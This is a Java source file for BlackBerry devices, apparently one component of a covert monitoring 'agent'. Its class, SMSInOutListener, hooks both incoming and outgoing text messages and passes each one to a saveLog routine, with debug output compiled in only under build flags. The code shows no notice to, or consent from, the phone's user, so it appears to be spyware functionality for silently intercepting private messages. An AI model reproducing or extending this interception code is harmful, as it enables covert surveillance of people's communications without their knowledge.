package blackberry.agent.sms;

import java.io.IOException;

import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;

import net.rim.blackberry.api.sms.OutboundMessageListener;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

class SMSInOutListener implements OutboundMessageListener, Runnable {

    //#ifdef DEBUG
    static Debug debug = new Debug("SMSINListener", DebugLevel.VERBOSE);

    //#endif

    private int messages;
    private final SmsListener smsListener;
    private final MessageConnection conn;

    boolean requestStop;

    public SMSInOutListener(final MessageConnection conn,
            final SmsListener smsListener) {
        messages = 0;
        this.conn = conn;
        this.smsListener = smsListener;
    }

    public synchronized void notifyIncomingMessage(final MessageConnection conn) {
        messages++;
        notifyAll();
    }

    public void stop() {
        requestStop = true;
    }

    public synchronized void notifyOutgoingMessage(Message message) {
        //#ifdef DEBUG_INFO
        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
        //#endif

        synchronized (this) {
            if (!requestStop) {
                smsListener.saveLog(message, false);
            }
        }
    }

    public void run() {
        requestStop = false;
        while (!requestStop) {
            while (messages > 0) {
                try {
                    final Message m = conn.receive();

                    smsListener.saveLog(m, true);

                } catch (final IOException e) {
                    e.printStackTrace();
                }
                messages--;
            }
            synchronized (this) {
                try {
                    wait();
                } catch (final Exception e) {
                    //#ifdef DEBUG_ERROR
                    debug.error(e);
                    //#endif
                }
            }
        }
    }

}
